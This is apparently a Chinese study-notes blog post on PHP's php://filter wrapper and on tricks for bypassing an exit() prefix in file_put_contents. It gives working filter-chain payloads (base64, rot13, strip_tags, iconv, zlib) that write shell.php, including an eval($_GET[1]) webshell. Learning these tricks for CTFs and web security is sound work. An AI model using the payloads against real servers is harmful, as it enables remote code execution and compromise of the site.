---
title: PHP-Filter伪协议与绕过死亡exit
date: 2025-12-18 20:12:51
tags:
- Filter伪协议
- 死亡exit
- 编码绕过
category:
- 学习笔记
---

# PHP-Filter伪协议与绕过死亡exit

## PHP Filter伪协议

 `php://filter`是`php`中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如`base64`编码处理，`rot13`处理等。官方解释为：

## Filter协议的使用方法

`Filter`协议的一般语法为：

```
php://filter/过滤器|过滤器/resource=待过滤的数据流
```

其中过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理。例如：

```
echo file_get_contents("php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,<?php phpinfo();?>");
```

### 字符串过滤器

以`string`字符串开头，常见的过滤器有`rot13`、`toupper`、`tolower`、`strip_tags`等，例如：

```
# string.rot13即对数据流进行str_rot13函数处理
echo file_get_contents("php://filter/read=string.rot13/resource=data://text/plain,abcdefg");
# 输出结果为nopqrst
```

`toupper、tolower`是对字符串进行大小写转换处理：

```
file_get_contents("php://filter/read=string.toupper/resource=data://text/plain,abcdefg");
```

strip_tags对数据流进行strip_tags函数的处理，该函数功能为剥去字符串中的 HTML、XML 以及 PHP 的标签，简单理解就是包含有尖括号中的东西。

```
file_get_contents("php://filter/read=string.strip_tags/resource=data://text/plain,<a>s</a>");
```

### 转换过滤器

主要含有三类，分别是`base64`的编码转换、`quoted-printable`的编码转换以及`iconv`字符编码的转换。该类过滤器以`convert`开头。

`base64`的编码转换操作，例如：

```
file_get_contents("php://filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w");
```

`Quoted-printable`可译为**可打印字符引用编码**，可以理解为将一些不可打印的`ASCII`字符进行一个编码转换，转换成`=`后面跟两个十六进制数，例如：

```
file_get_contents("php://filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w".chr(12));
# 输出为m1sn0w=0C
```

**iconv过滤器**也就是对输入输出的数据进行一个编码转换，其格式为convert.iconv.<input-encoding>.<output-encoding>或者convert.iconv.<input-encoding>/<output-encoding>，表达的意思都是相同的，即将输入的字符串编码转换成输出指定的编码，例如：

```
file_get_contents("php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w".chr(12));
```

### 压缩过滤器

主要有两类，`zlib`和`bzip2`，其中`zlib.deflate`和`bzip2.compress`用于压缩，`zlib.inflate`和`bzip2.decompress`用于解压缩。

### 加密过滤器

以`mcrypt`开头，后面指定一个加密算法。本特性已自`PHP 7.1.0`起废弃。强烈建议不要使用本特性。

## Filter伪协议的trick

## 绕过死亡exit

例如这种情况：

```
file_put_contents($filename,"<?php exit();".$content);
```

这时，如果想要写入`WebShell`，就需要利用到过滤器来进行一些操作，将输入的字符串中的`exit()`函数处理掉或者让它失效，从而达到代码执行的目的。

### `Base64`编码绕过

Base64在进行解码的时候，是4个字符一组进行解码，也就是说如果构造一个字符串如aaaabTFzbjB3，前面的四个a会被当成一组进行正常解码，后面真正的base64编码也就会正常解码。因此在使用base64编码绕过该限制的时候，需要自己补一些填充符，让前面需要绕过的字符串组合起来长度是4的倍数，因为前面参数解码的字符串只有phpexit，因此上述的绕过方式为：

```
$filename = "php://filter/write=convert.base64-decode/resource=shell.php";
$content = "aPD9waHAgcGhwaW5mbygpOz8+"
```

### `rot13`绕过

方式和`base64`类似，将`payload`转换一下即可：

```
$filename = "php://filter/write=string.rot13/resource=shell.php";
$content = "<?cuc cucvasb();?>";
```

### 组合方式绕过

例如使用`strip_tags`和`base64`进行绕过：

```
$filename = "php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php";
$content = "?>PD9waHAgcGhwaW5mbygpOz8+";
```

## 文件内容变量相同绕过

比如下面这种情况：文件名和拼写的内容相同，还需要绕过exit

```
file_put_contents($content,"<?php exit();".$content);
```

如果没有`exit`的话，这种写入方式就比较简单，例如：

```
$content = "php://filter/write=<?php phpinfo();?>/resource=shell.php";
```

#### 利用`rot13`绕过

构造如下`payload`:前提是目标服务器没有开启短标签。

```
$content = "php://filter/write=string.rot13|<?cuc cucvasb();?>/resource=shell.php";
```

#### `iconv`字符编码转换

这里用到几种编码：

```
UCS-2：对目标字符串进行2位一反转
UCS-4：对目标字符串进行4位一反转
```

`payload`生成：

```
<?php
$a = "<?php phpinfo();?>aa";
echo iconv("UCS-4LE","UCS-4BE",$a);
```

因此，对于上述的绕过，可以使用如下`payload`：

```
# 2位一反转
$content = "php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|?<hp phpipfn(o;)>?/resource=shell.php";

# 4位一反转（注意添加一些填充位）
$content = "php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|aa?<aa phpiphp(ofn>?;)/resource=shell.php";
```

##### 利用压缩过滤器进行绕过

使用到`zlib.inflate`和`zlib.deflate`，将数据压缩以后再进行解压，而关键就在于如何在解压的时候将`exit`去掉。

在`zlib.inflate`和`zlib.deflate`过滤器的中间加上一个字符串过滤器，会将`exit`解压成其他的字串，例如：

```
$content = 'php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=shell.php';
file_put_contents($content,'<?php exit();'.$content);
```

#### 组合绕过方式

`strip_tags`+`base64`编码绕过

绕过思路就是：闭合前面的`<?php`标签，并使用`strip_tags`进行处理过滤，然后正常`base64`解码

```
$content = "php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+/../shell.php";
```

这里其实还有一个小`trick`，就是`resource`后面的路径，`php://filter`仍然会将其视作位过滤器进行一个过滤处理，例如：

```
$content = "php://filter/resource=./convert.base64-encode/../shell.php";
```































